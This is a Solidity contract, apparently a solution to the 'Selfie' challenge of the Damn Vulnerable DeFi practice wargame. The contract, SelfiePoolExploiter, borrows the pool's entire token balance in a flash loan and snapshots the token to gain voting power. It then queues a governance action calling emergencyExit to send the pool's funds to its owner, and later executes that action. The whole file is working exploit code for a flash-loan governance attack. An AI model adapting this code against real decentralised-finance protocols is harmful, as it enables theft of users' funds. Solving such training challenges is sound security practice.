pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

import "hardhat/console.sol";


contract SelfiePoolExploiter is IERC3156FlashBorrower {

    DamnValuableTokenSnapshot public immutable DVtoken;
    SimpleGovernance public immutable governance;
    SelfiePool public immutable selfie;
    address public immutable owner;
    uint256 private actionID;

    constructor(address _token, address _governance, address _selfie) {
        DVtoken = DamnValuableTokenSnapshot(_token);
        governance = SimpleGovernance(_governance);
        selfie = SelfiePool(_selfie);
        owner = msg.sender;
    }

    function initFlashLoan() external {
        require(msg.sender == owner, 'owner initiates flashloans');
        bool succ = selfie.flashLoan(this, address(DVtoken), DVtoken.balanceOf(address(selfie)), '0x');
        require(succ, "Flashloan function failed");
    }
    
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        DVtoken.snapshot();
        executeProposal();
        uint256 repayAmount = amount + fee;
        DVtoken.approve(msg.sender, repayAmount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeProposal() private returns (uint256 _actionID){
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", owner);
        actionID = governance.queueAction(address(selfie), 0, data);
        return actionID;
    }

    function executeAction() external {
        require(actionID > 0, "actionID doesnt exist");
        require(msg.sender == owner, 'owner can only call this function');
        governance.executeAction(actionID);
    }

}